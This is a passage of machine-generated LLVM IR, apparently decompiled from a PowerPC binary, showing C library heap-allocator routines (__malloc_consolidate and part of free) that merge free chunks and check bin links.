  store i32 %v0_1000bdf4, i32* %v3_1000bdf4, align 4
  %v0_1000be10.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000be00

dec_label_pc_1000bdfc:                            ; preds = %dec_label_pc_1000bd9c, %dec_label_pc_1000bdd0, %dec_label_pc_1000bdb8, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000be00

dec_label_pc_1000be00:                            ; preds = %dec_label_pc_1000bdd8, %dec_label_pc_1000bdfc
  %v0_1000be10 = phi i32 [ %v0_1000be10.pre, %dec_label_pc_1000bdd8 ], [ 0, %dec_label_pc_1000bdfc ]
  ret i32 %v0_1000be10

; uselistorder directives
  uselistorder i32 %v1_1000bda0, { 1, 0, 2 }
  uselistorder i32 %v1_1000bd80, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 7, 5, 4, 8, 6, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000be00, { 1, 0 }
  uselistorder label %dec_label_pc_1000bdfc, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000be14 = load i32, i32* @lr, align 4
  store i32 %v0_1000be14, i32* %r0.global-to-local, align 4
  store i32 95, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 95, i32* %ctr.global-to-local, align 4
  %v0_1000be30 = load i32, i32* @r3, align 4
  store i32 %v0_1000be30, i32* @r31, align 4
  %v1_1000be34 = inttoptr i32 %v0_1000be30 to i32*
  %v2_1000be34 = load i32, i32* %v1_1000be34, align 4
  store i32 %v2_1000be34, i32* %r0.global-to-local, align 4
  %v3_1000be38 = icmp eq i32 %v2_1000be34, 0
  br i1 %v3_1000be38, label %dec_label_pc_1000bf64, label %dec_label_pc_1000be40

dec_label_pc_1000be40:                            ; preds = %entry
  %v1_1000be40 = call i32 @__asm_rlwinm(i32 %v2_1000be34, i32 0, i32 31, i32 29)
  store i32 %v1_1000be40, i32* %r0.global-to-local, align 4
  %v0_1000be44 = load i32, i32* @r31, align 4
  %v1_1000be44 = add i32 %v0_1000be44, 4
  store i32 %v1_1000be44, i32* %r4.global-to-local, align 4
  %v1_1000be48 = call i32 @__asm_rlwinm(i32 %v1_1000be40, i32 31, i32 1, i32 29)
  store i32 %v1_1000be48, i32* %r9.global-to-local, align 4
  %v1_1000be4c = load i32, i32* @r3, align 4
  %v2_1000be4c = inttoptr i32 %v1_1000be4c to i32*
  store i32 %v1_1000be40, i32* %v2_1000be4c, align 4
  %v0_1000be50 = load i32, i32* @r3, align 4
  %v1_1000be50 = add i32 %v0_1000be50, -4
  store i32 %v1_1000be50, i32* %r0.global-to-local, align 4
  %v1_1000be54 = add i32 %v0_1000be50, 52
  store i32 %v1_1000be54, i32* %r3.global-to-local, align 4
  %v2_1000be58 = add i32 %v1_1000be50, %v1_1000be48
  store i32 %v2_1000be58, i32* @r29, align 4
  %v0_1000be5c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000be5c

dec_label_pc_1000be5c:                            ; preds = %dec_label_pc_1000bf5c, %dec_label_pc_1000be40
  %v1_1000bf546 = phi i32 [ %v1_1000bf54, %dec_label_pc_1000bf5c ], [ %v2_1000be58, %dec_label_pc_1000be40 ]
  %v1_1000be6c = phi i32 [ %v1_1000bf5c, %dec_label_pc_1000bf5c ], [ %v0_1000be5c.pre, %dec_label_pc_1000be40 ]
  %v1_1000be5c = inttoptr i32 %v1_1000be6c to i32*
  %v2_1000be5c = load i32, i32* %v1_1000be5c, align 4
  store i32 %v2_1000be5c, i32* @r11, align 4
  %v3_1000be60 = icmp eq i32 %v2_1000be5c, 0
  br i1 %v3_1000be60, label %dec_label_pc_1000bf54, label %dec_label_pc_1000be68

dec_label_pc_1000be68:                            ; preds = %dec_label_pc_1000be5c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v1_1000be5c, align 4
  %v0_1000be70.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000be70

dec_label_pc_1000be70:                            ; preds = %dec_label_pc_1000bf48, %dec_label_pc_1000be68
  %v0_1000be70 = phi i32 [ %v0_1000bf48, %dec_label_pc_1000bf48 ], [ %v0_1000be70.pre, %dec_label_pc_1000be68 ]
  %v1_1000be70 = add i32 %v0_1000be70, 4
  %v2_1000be70 = inttoptr i32 %v1_1000be70 to i32*
  %v3_1000be70 = load i32, i32* %v2_1000be70, align 4
  store i32 %v3_1000be70, i32* %r0.global-to-local, align 4
  %v1_1000be74 = add i32 %v0_1000be70, 8
  %v2_1000be74 = inttoptr i32 %v1_1000be74 to i32*
  %v3_1000be74 = load i32, i32* %v2_1000be74, align 4
  store i32 %v3_1000be74, i32* @r30, align 4
  %v1_1000be78 = urem i32 %v3_1000be70, 2
  store i32 %v1_1000be78, i32* %r9.global-to-local, align 4
  %v3_1000be78 = icmp eq i32 %v1_1000be78, 0
  store i1 %v3_1000be78, i1* @cr0_eq, align 1
  %v1_1000be7c = call i32 @__asm_rlwinm(i32 %v3_1000be70, i32 0, i32 0, i32 30)
  store i32 %v1_1000be7c, i32* %r6.global-to-local, align 4
  %v0_1000be80 = load i32, i32* @r11, align 4
  %v2_1000be80 = add i32 %v0_1000be80, %v1_1000be7c
  store i32 %v2_1000be80, i32* @r8, align 4
  %v1_1000be84 = add i32 %v2_1000be80, 4
  %v2_1000be84 = inttoptr i32 %v1_1000be84 to i32*
  %v3_1000be84 = load i32, i32* %v2_1000be84, align 4
  %v0_1000be88 = load i1, i1* @cr0_eq, align 1
  br i1 %v0_1000be88, label %dec_label_pc_1000be8c, label %dec_label_pc_1000bec0

dec_label_pc_1000be8c:                            ; preds = %dec_label_pc_1000be70
  %v1_1000be8c = inttoptr i32 %v0_1000be80 to i32*
  %v2_1000be8c = load i32, i32* %v1_1000be8c, align 4
  store i32 %v2_1000be8c, i32* %r5.global-to-local, align 4
  %v2_1000be90 = sub i32 %v0_1000be80, %v2_1000be8c
  store i32 %v2_1000be90, i32* %r9.global-to-local, align 4
  %v1_1000be94 = add i32 %v2_1000be90, 8
  %v2_1000be94 = inttoptr i32 %v1_1000be94 to i32*
  %v3_1000be94 = load i32, i32* %v2_1000be94, align 4
  store i32 %v3_1000be94, i32* %r7.global-to-local, align 4
  %v1_1000be98 = add i32 %v2_1000be90, 12
  %v2_1000be98 = inttoptr i32 %v1_1000be98 to i32*
  %v3_1000be98 = load i32, i32* %v2_1000be98, align 4
  store i32 %v3_1000be98, i32* %r10.global-to-local, align 4
  %v1_1000be9c = add i32 %v3_1000be94, 12
  %v2_1000be9c = inttoptr i32 %v1_1000be9c to i32*
  %v3_1000be9c = load i32, i32* %v2_1000be9c, align 4
  store i32 %v3_1000be9c, i32* @r11, align 4
  %v4_1000bea0 = icmp eq i32 %v3_1000be9c, %v2_1000be90
  br i1 %v4_1000bea0, label %dec_label_pc_1000bea8, label %dec_label_pc_1000bf04

dec_label_pc_1000bea8:                            ; preds = %dec_label_pc_1000be8c
  %v1_1000bea8 = add i32 %v3_1000be98, 8
  %v2_1000bea8 = inttoptr i32 %v1_1000bea8 to i32*
  %v3_1000bea8 = load i32, i32* %v2_1000bea8, align 4
  store i32 %v3_1000bea8, i32* %r0.global-to-local, align 4
  %v4_1000beac = icmp eq i32 %v3_1000bea8, %v2_1000be90
  br i1 %v4_1000beac, label %dec_label_pc_1000beb4, label %dec_label_pc_1000bf04

dec_label_pc_1000beb4:                            ; preds = %dec_label_pc_1000bea8
  store i32 %v3_1000be94, i32* %v2_1000bea8, align 4
  %v0_1000beb8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000beb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000beb8 = add i32 %v1_1000beb8, %v0_1000beb8
  store i32 %v2_1000beb8, i32* %r6.global-to-local, align 4
  %v0_1000bebc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bebc = load i32, i32* %r7.global-to-local, align 4
  %v2_1000bebc = add i32 %v1_1000bebc, 12
  %v3_1000bebc = inttoptr i32 %v2_1000bebc to i32*
  store i32 %v0_1000bebc, i32* %v3_1000bebc, align 4
  br label %dec_label_pc_1000bec0

dec_label_pc_1000bec0:                            ; preds = %dec_label_pc_1000be70, %dec_label_pc_1000beb4
  %v0_1000bec0 = load i32, i32* @r31, align 4
  %v1_1000bec0 = add i32 %v0_1000bec0, 44
  %v2_1000bec0 = inttoptr i32 %v1_1000bec0 to i32*
  %v3_1000bec0 = load i32, i32* %v2_1000bec0, align 4
  store i32 %v3_1000bec0, i32* %r0.global-to-local, align 4
  %v1_1000bec4 = call i32 @__asm_rlwinm(i32 %v3_1000be84, i32 0, i32 0, i32 29)
  store i32 %v1_1000bec4, i32* %r7.global-to-local, align 4
  %v0_1000bec8 = load i32, i32* @r8, align 4
  %v1_1000bec8 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000bec8 = icmp eq i32 %v0_1000bec8, %v1_1000bec8
  br i1 %v4_1000bec8, label %dec_label_pc_1000bf38, label %dec_label_pc_1000bed0

dec_label_pc_1000bed0:                            ; preds = %dec_label_pc_1000bec0
  %v2_1000bed0 = add i32 %v0_1000bec8, %v1_1000bec4
  store i32 %v2_1000bed0, i32* %r9.global-to-local, align 4
  %v1_1000bed4 = add i32 %v2_1000bed0, 4
  %v2_1000bed4 = inttoptr i32 %v1_1000bed4 to i32*
  %v3_1000bed4 = load i32, i32* %v2_1000bed4, align 4
  store i32 %v3_1000bed4, i32* %r0.global-to-local, align 4
  %v2_1000bed8 = add i32 %v0_1000bec8, 4
  %v3_1000bed8 = inttoptr i32 %v2_1000bed8 to i32*
  store i32 %v1_1000bec4, i32* %v3_1000bed8, align 4
  %v0_1000bedc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bedc = urem i32 %v0_1000bedc, 2
  store i32 %v1_1000bedc, i32* %r9.global-to-local, align 4
  %v3_1000bedc = icmp eq i32 %v1_1000bedc, 0
  store i1 %v3_1000bedc, i1* @cr0_eq, align 1
  br i1 %v3_1000bedc, label %dec_label_pc_1000bee4, label %dec_label_pc_1000bf14

dec_label_pc_1000bee4:                            ; preds = %dec_label_pc_1000bed0
  %v0_1000bee4 = load i32, i32* @r8, align 4
  %v1_1000bee4 = add i32 %v0_1000bee4, 8
  %v2_1000bee4 = inttoptr i32 %v1_1000bee4 to i32*
  %v3_1000bee4 = load i32, i32* %v2_1000bee4, align 4
  store i32 %v3_1000bee4, i32* %r10.global-to-local, align 4
  %v1_1000bee8 = add i32 %v0_1000bee4, 12
  %v2_1000bee8 = inttoptr i32 %v1_1000bee8 to i32*
  %v3_1000bee8 = load i32, i32* %v2_1000bee8, align 4
  store i32 %v3_1000bee8, i32* %r9.global-to-local, align 4
  %v1_1000beec = add i32 %v3_1000bee4, 12
  %v2_1000beec = inttoptr i32 %v1_1000beec to i32*
  %v3_1000beec = load i32, i32* %v2_1000beec, align 4
  store i32 %v3_1000beec, i32* %r0.global-to-local, align 4
  %v4_1000bef0 = icmp eq i32 %v3_1000beec, %v0_1000bee4
  br i1 %v4_1000bef0, label %dec_label_pc_1000bef8, label %dec_label_pc_1000bf04

dec_label_pc_1000bef8:                            ; preds = %dec_label_pc_1000bee4
  %v1_1000bef8 = add i32 %v3_1000bee8, 8
  %v2_1000bef8 = inttoptr i32 %v1_1000bef8 to i32*
  %v3_1000bef8 = load i32, i32* %v2_1000bef8, align 4
  store i32 %v3_1000bef8, i32* %r0.global-to-local, align 4
  %v4_1000befc = icmp eq i32 %v3_1000bef8, %v0_1000bee4
  br i1 %v4_1000befc, label %dec_label_pc_1000bf08, label %dec_label_pc_1000bf04

dec_label_pc_1000bf04:                            ; preds = %dec_label_pc_1000bee4, %dec_label_pc_1000bea8, %dec_label_pc_1000be8c, %dec_label_pc_1000bef8
  %v0_1000bf04 = call i32 @abort()
  store i32 %v0_1000bf04, i32* %r3.global-to-local, align 4
  %v0_1000bf08.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bf08.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000bf08

dec_label_pc_1000bf08:                            ; preds = %dec_label_pc_1000bef8, %dec_label_pc_1000bf04
  %v1_1000bf08 = phi i32 [ %v3_1000bee8, %dec_label_pc_1000bef8 ], [ %v1_1000bf08.pre, %dec_label_pc_1000bf04 ]
  %v0_1000bf08 = phi i32 [ %v3_1000bee4, %dec_label_pc_1000bef8 ], [ %v0_1000bf08.pre, %dec_label_pc_1000bf04 ]
  %v2_1000bf08 = add i32 %v1_1000bf08, 8
  %v3_1000bf08 = inttoptr i32 %v2_1000bf08 to i32*
  store i32 %v0_1000bf08, i32* %v3_1000bf08, align 4
  %v0_1000bf0c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000bf0c = load i32, i32* %r7.global-to-local, align 4
  %v2_1000bf0c = add i32 %v1_1000bf0c, %v0_1000bf0c
  store i32 %v2_1000bf0c, i32* %r6.global-to-local, align 4
  %v0_1000bf10 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bf10 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000bf10 = add i32 %v1_1000bf10, 12
  %v3_1000bf10 = inttoptr i32 %v2_1000bf10 to i32*
  store i32 %v0_1000bf10, i32* %v3_1000bf10, align 4
  br label %dec_label_pc_1000bf14

dec_label_pc_1000bf14:                            ; preds = %dec_label_pc_1000bed0, %dec_label_pc_1000bf08
  %v0_1000bf14 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000bf14 = add i32 %v0_1000bf14, 8
  %v2_1000bf14 = inttoptr i32 %v1_1000bf14 to i32*
  %v3_1000bf14 = load i32, i32* %v2_1000bf14, align 4
  store i32 %v3_1000bf14, i32* %r9.global-to-local, align 4
  %v0_1000bf18 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000bf18 = or i32 %v0_1000bf18, 1
  store i32 %v1_1000bf18, i32* %r0.global-to-local, align 4
  %v0_1000bf1c = load i32, i32* @r11, align 4
  store i32 %v0_1000bf1c, i32* %v2_1000bf14, align 4
  %v0_1000bf20 = load i32, i32* @r11, align 4
  %v1_1000bf20 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000bf20 = add i32 %v1_1000bf20, 12
  %v3_1000bf20 = inttoptr i32 %v2_1000bf20 to i32*
  store i32 %v0_1000bf20, i32* %v3_1000bf20, align 4
  %v0_1000bf24 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000bf24 = load i32, i32* @r11, align 4
  %v3_1000bf24 = add i32 %v1_1000bf24, %v0_1000bf24
  %v4_1000bf24 = inttoptr i32 %v3_1000bf24 to i32*
  store i32 %v0_1000bf24, i32* %v4_1000bf24, align 4
  %v0_1000bf28 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bf28 = load i32, i32* @r11, align 4
  %v2_1000bf28 = add i32 %v1_1000bf28, 4
  %v3_1000bf28 = inttoptr i32 %v2_1000bf28 to i32*
  store i32 %v0_1000bf28, i32* %v3_1000bf28, align 4
  %v0_1000bf2c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bf2c = load i32, i32* @r11, align 4
  %v2_1000bf2c = add i32 %v1_1000bf2c, 8
  %v3_1000bf2c = inttoptr i32 %v2_1000bf2c to i32*
  store i32 %v0_1000bf2c, i32* %v3_1000bf2c, align 4
  %v0_1000bf30 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000bf30 = load i32, i32* @r11, align 4
  %v2_1000bf30 = add i32 %v1_1000bf30, 12
  %v3_1000bf30 = inttoptr i32 %v2_1000bf30 to i32*
  store i32 %v0_1000bf30, i32* %v3_1000bf30, align 4
  br label %dec_label_pc_1000bf48

dec_label_pc_1000bf38:                            ; preds = %dec_label_pc_1000bec0
  %v0_1000bf38 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000bf38 = add i32 %v0_1000bf38, %v1_1000bec4
  store i32 %v2_1000bf38, i32* %r0.global-to-local, align 4
  %v0_1000bf3c = load i32, i32* @r11, align 4
  %v1_1000bf3c = load i32, i32* @r31, align 4
  %v2_1000bf3c = add i32 %v1_1000bf3c, 44
  %v3_1000bf3c = inttoptr i32 %v2_1000bf3c to i32*
  store i32 %v0_1000bf3c, i32* %v3_1000bf3c, align 4
  %v0_1000bf40 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bf40 = or i32 %v0_1000bf40, 1
  store i32 %v1_1000bf40, i32* %r0.global-to-local, align 4
  %v1_1000bf44 = load i32, i32* @r11, align 4
  %v2_1000bf44 = add i32 %v1_1000bf44, 4
  %v3_1000bf44 = inttoptr i32 %v2_1000bf44 to i32*
  store i32 %v1_1000bf40, i32* %v3_1000bf44, align 4
  br label %dec_label_pc_1000bf48

dec_label_pc_1000bf48:                            ; preds = %dec_label_pc_1000bf14, %dec_label_pc_1000bf38
  %v0_1000bf48 = load i32, i32* @r30, align 4
  %v3_1000bf48 = icmp eq i32 %v0_1000bf48, 0
  store i32 %v0_1000bf48, i32* @r11, align 4
  br i1 %v3_1000bf48, label %dec_label_pc_1000bf54.loopexit, label %dec_label_pc_1000be70

dec_label_pc_1000bf54.loopexit:                   ; preds = %dec_label_pc_1000bf48
  %v0_1000bf54.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000bf54.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000bf54

dec_label_pc_1000bf54:                            ; preds = %dec_label_pc_1000bf54.loopexit, %dec_label_pc_1000be5c
  %v1_1000bf54 = phi i32 [ %v1_1000bf54.pre, %dec_label_pc_1000bf54.loopexit ], [ %v1_1000bf546, %dec_label_pc_1000be5c ]
  %v0_1000bf5c = phi i32 [ %v0_1000bf54.pre, %dec_label_pc_1000bf54.loopexit ], [ %v1_1000be6c, %dec_label_pc_1000be5c ]
  %v4_1000bf54 = icmp eq i32 %v0_1000bf5c, %v1_1000bf54
  br i1 %v4_1000bf54, label %dec_label_pc_1000bfcc, label %dec_label_pc_1000bf5c

dec_label_pc_1000bf5c:                            ; preds = %dec_label_pc_1000bf54
  %v1_1000bf5c = add i32 %v0_1000bf5c, 4
  store i32 %v1_1000bf5c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000be5c

dec_label_pc_1000bf64:                            ; preds = %entry, %dec_label_pc_1000bf64.dec_label_pc_1000bf64_crit_edge
  %v0_1000bf6c = phi i32 [ %v0_1000bf6c.pre, %dec_label_pc_1000bf64.dec_label_pc_1000bf64_crit_edge ], [ %v0_1000be30, %entry ]
  %v0_1000bf64 = phi i32 [ %v0_1000bf64.pre, %dec_label_pc_1000bf64.dec_label_pc_1000bf64_crit_edge ], [ 1, %entry ]
  %v1_1000bf64 = mul i32 %v0_1000bf64, 8
  %v1_1000bf68 = add i32 %v0_1000bf64, 1
  store i32 %v1_1000bf68, i32* %r11.global-to-local, align 4
  %v2_1000bf6c = add i32 %v1_1000bf64, %v0_1000bf6c
  %v1_1000bf70 = add i32 %v2_1000bf6c, 44
  store i32 %v1_1000bf70, i32* %r9.global-to-local, align 4
  %v2_1000bf74 = add i32 %v2_1000bf6c, 52
  %v3_1000bf74 = inttoptr i32 %v2_1000bf74 to i32*
  store i32 %v1_1000bf70, i32* %v3_1000bf74, align 4
  %v0_1000bf78 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000bf78 = add i32 %v0_1000bf78, 12
  %v3_1000bf78 = inttoptr i32 %v2_1000bf78 to i32*
  store i32 %v0_1000bf78, i32* %v3_1000bf78, align 4
  %v0_1000bf7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bf7c = add i32 %v0_1000bf7c, -1
  store i32 %v1_1000bf7c, i32* %ctr.global-to-local, align 4
  %v2_1000bf7c = icmp eq i32 %v1_1000bf7c, 0
  br i1 %v2_1000bf7c, label %dec_label_pc_1000bf80, label %dec_label_pc_1000bf64.dec_label_pc_1000bf64_crit_edge

dec_label_pc_1000bf64.dec_label_pc_1000bf64_crit_edge: ; preds = %dec_label_pc_1000bf64
  %v0_1000bf64.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000bf6c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bf64

dec_label_pc_1000bf80:                            ; preds = %dec_label_pc_1000bf64
  %v0_1000bf80 = load i32, i32* @r31, align 4
  %v1_1000bf80 = inttoptr i32 %v0_1000bf80 to i32*
  %v2_1000bf80 = load i32, i32* %v1_1000bf80, align 4
  store i32 %v2_1000bf80, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000bf88 = add i32 %v0_1000bf80, 864
  %v2_1000bf88 = inttoptr i32 %v1_1000bf88 to i32*
  %v3_1000bf88 = load i32, i32* %v2_1000bf88, align 4
  store i32 262144, i32* %r10.global-to-local, align 4
  %v1_1000bf90 = urem i32 %v2_1000bf80, 4
  %v1_1000bf94 = add i32 %v0_1000bf80, 52
  store i32 %v1_1000bf94, i32* @r8, align 4
  %v1_1000bf98 = or i32 %v3_1000bf88, 1
  store i32 %v1_1000bf98, i32* @r11, align 4
  %v1_1000bf9c = or i32 %v1_1000bf90, 72
  store i32 %v1_1000bf9c, i32* %r9.global-to-local, align 4
  %v2_1000bfa0 = add i32 %v0_1000bf80, 840
  %v3_1000bfa0 = inttoptr i32 %v2_1000bfa0 to i32*
  store i32 0, i32* %v3_1000bfa0, align 4
  store i32 65536, i32* %r0.global-to-local, align 4
  %v1_1000bfa8 = load i32, i32* @r31, align 4
  %v2_1000bfa8 = add i32 %v1_1000bfa8, 852
  %v3_1000bfa8 = inttoptr i32 %v2_1000bfa8 to i32*
  store i32 65536, i32* %v3_1000bfa8, align 4
  store i32 30, i32* %r3.global-to-local, align 4
  %v0_1000bfb0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bfb0 = load i32, i32* @r31, align 4
  %v2_1000bfb0 = add i32 %v1_1000bfb0, 836
  %v3_1000bfb0 = inttoptr i32 %v2_1000bfb0 to i32*
  store i32 %v0_1000bfb0, i32* %v3_1000bfb0, align 4
  %v0_1000bfb4 = load i32, i32* @r11, align 4
  %v1_1000bfb4 = load i32, i32* @r31, align 4
  %v2_1000bfb4 = add i32 %v1_1000bfb4, 864
  %v3_1000bfb4 = inttoptr i32 %v2_1000bfb4 to i32*
  store i32 %v0_1000bfb4, i32* %v3_1000bfb4, align 4
  %v1_1000bfb8 = load i32, i32* @r31, align 4
  %v2_1000bfb8 = inttoptr i32 %v1_1000bfb8 to i32*
  store i32 %v1_1000bf9c, i32* %v2_1000bfb8, align 4
  %v1_1000bfbc = load i32, i32* @r31, align 4
  %v2_1000bfbc = add i32 %v1_1000bfbc, 44
  %v3_1000bfbc = inttoptr i32 %v2_1000bfbc to i32*
  store i32 %v1_1000bf94, i32* %v3_1000bfbc, align 4
  %v0_1000bfc0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bfc0 = load i32, i32* @r31, align 4
  %v2_1000bfc0 = add i32 %v1_1000bfc0, 844
  %v3_1000bfc0 = inttoptr i32 %v2_1000bfc0 to i32*
  store i32 %v0_1000bfc0, i32* %v3_1000bfc0, align 4
  store i32 268484552, i32* @lr, align 4
  %v3_1000bfc4 = call i32 @sysconf(i32 30, i32 %v1_1000bf94, i32 %v1_1000bf9c)
  store i32 %v3_1000bfc4, i32* %r3.global-to-local, align 4
  %v1_1000bfc8 = load i32, i32* @r31, align 4
  %v2_1000bfc8 = add i32 %v1_1000bfc8, 860
  %v3_1000bfc8 = inttoptr i32 %v2_1000bfc8 to i32*
  store i32 %v3_1000bfc4, i32* %v3_1000bfc8, align 4
  br label %dec_label_pc_1000bfcc

dec_label_pc_1000bfcc:                            ; preds = %dec_label_pc_1000bf54, %dec_label_pc_1000bf80
  store i32 %v0_1000be14, i32* %r0.global-to-local, align 4
  %v0_1000bfdc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000bfdc

; uselistorder directives
  uselistorder i32 %v1_1000bf7c, { 1, 0 }
  uselistorder i32 %v0_1000bf78, { 1, 0 }
  uselistorder i32 %v0_1000bf64, { 1, 0 }
  uselistorder i32 %v1_1000bf5c, { 1, 0 }
  uselistorder i32 %v0_1000bf48, { 0, 2, 1 }
  uselistorder i32 %v0_1000bf24, { 1, 0 }
  uselistorder i32 %v1_1000bedc, { 1, 0 }
  uselistorder i32 %v0_1000bec8, { 1, 0, 2 }
  uselistorder i32 %v1_1000bec4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000be80, { 2, 1, 0 }
  uselistorder i32 %v1_1000be78, { 1, 0 }
  uselistorder i32 %v3_1000be70, { 1, 0, 2 }
  uselistorder i32 %v0_1000be70, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 9, 10, 11, 12, 13, 14, 15, 4, 3, 0, 1, 2, 5, 6, 7, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 5, 6, 7, 3, 0, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 6, 3, 4, 1, 5 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 5, 6, 7, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 1, 2, 3, 4, 5, 6, 8, 7, 10, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 262144, { 1, 0 }
  uselistorder label %dec_label_pc_1000bfcc, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf64, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf48, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf14, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf08, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf04, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bec0, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000bfe4 = load i32, i32* @lr, align 4
  store i32 %v0_1000bfe4, i32* %r0.global-to-local, align 4
  %v0_1000bfec = load i32, i32* @r3, align 4
  store i32 %v0_1000bfec, i32* @r31, align 4
  %v3_1000bfec = icmp eq i32 %v0_1000bfec, 0
  store i1 %v3_1000bfec, i1* @cr0_eq, align 1
  br i1 %v3_1000bfec, label %dec_label_pc_1000c1d8, label %dec_label_pc_1000bff8

dec_label_pc_1000bff8:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10021074.479 to i32), i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32* %r4.global-to-local, align 4
  %v2_1000c00c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000c00c, i32* %r3.global-to-local, align 4
  %v5_1000c010 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32 ptrtoint (i32* @global_var_10021074.479 to i32))
  %v0_1000c014 = load i32, i32* @r29, align 4
  store i32 %v0_1000c014, i32* %r3.global-to-local, align 4
  %v1_1000c018 = call i32 @__pthread_return_0(i32 %v0_1000c014)
  store i32 %v1_1000c018, i32* %r3.global-to-local, align 4
  %v0_1000c01c = load i32, i32* @r31, align 4
  %v1_1000c01c = add i32 %v0_1000c01c, -8
  store i32 %v1_1000c01c, i32* @r8, align 4
  store i32 268566528, i32* %r7.global-to-local, align 4
  %v1_1000c024 = add i32 %v0_1000c01c, -4
  %v2_1000c024 = inttoptr i32 %v1_1000c024 to i32*
  %v3_1000c024 = load i32, i32* %v2_1000c024, align 4
  store i32 %v3_1000c024, i32* %r9.global-to-local, align 4
  %v3_1000c028 = load i32, i32* @global_var_10023a2c.481, align 4
  store i32 %v3_1000c028, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c01c, i32* %r6.global-to-local, align 4
  %v1_1000c030 = call i32 @__asm_rlwinm(i32 %v3_1000c024, i32 0, i32 0, i32 29)
  store i32 %v1_1000c030, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r11, align 4
  %v3_1000c038 = icmp ugt i32 %v1_1000c030, %v3_1000c028
  br i1 %v3_1000c038, label %dec_label_pc_1000c060, label %dec_label_pc_1000c040

dec_label_pc_1000c040:                            ; preds = %dec_label_pc_1000bff8
  %v1_1000c040 = call i32 @__asm_rlwinm(i32 %v1_1000c030, i32 31, i32 1, i32 29)
  store i32 %v1_1000c040, i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a28.467 to i32), i32* @r11, align 4
  %v2_1000c048 = add i32 %v1_1000c040, ptrtoint (i32* @global_var_10023a28.467 to i32)
  %v3_1000c048 = inttoptr i32 %v2_1000c048 to i32*
  %v4_1000c048 = load i32, i32* %v3_1000c048, align 4
  store i32 %v4_1000c048, i32* %r9.global-to-local, align 4
